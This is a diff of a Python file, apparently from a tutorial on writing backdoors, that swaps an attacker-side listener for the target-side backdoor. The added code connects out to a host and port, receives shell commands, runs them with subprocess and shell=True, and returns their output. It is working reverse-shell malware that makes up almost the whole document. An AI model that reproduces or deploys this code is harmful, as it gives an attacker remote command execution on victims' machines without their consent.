@@ -1,6 +1,6 @@
-#backdoor to be run from ATTACKER machine
-#run me first
-#use ctrl+c on my console to close backdoor
+#backdoor that runs on target machine
+
+
 import socket
 import json
 import os
@@ -9,32 +9,45 @@ import subprocess
 import threading
 import time
 
-#TODO make and use a function named "target_communication" (step 3)
-#...name doesn't make sense but whatever
+
 
 ip = '127.0.0.1'
 port = 4141
 
-server = socket.socket()
-server.bind((ip, port))
+client = socket.socket()
 
-print('listening For target connection ...')
-server.listen(1)
-client, client_addr = server.accept()
-print(f'[+] {client_addr} connected')
+client.connect((ip, port))
+print("connected")
 
-#TODO (step 5) make the cd command work basically
+#TODO put getting command in a function (step 3)
+def execute_shell():
+    while True:
+        command = client.recv(1024)
+        command = command.decode()
+        if command == 'quit':
+            break
+        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+        output = op.stdout.read()
+        output_error = op.stderr.read()
+        #send response/output back to attacker
+        #print(f"sending: {output.decode() + output_error.decode()}")
+        print(f"sent output from command: {command}")
+        client.send(output + output_error)
+        
 
-#TODO (step 6) "keylog command"
-
-# send commands and receive output in loop
-while True:
-    command = input('enter command: ')
-    command = command.encode()
-    client.send(command)
-    output = client.recv(1024)
-    output = output.decode()
-    print(f"output: {output}")
+execute_shell()
+# main loop
+# while True:
+#     #wait for a command from attacker
+#     command = client.recv(1024)
+#     command = command.decode()
+#     op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+#     output = op.stdout.read()
+#     output_error = op.stderr.read()
+#     #send response/output back to attacker
+#     #print(f"sending: {output.decode() + output_error.decode()}")
+#     print(f"sent output from command: {command}")
+#     client.send(output + output_error)
 
 
 
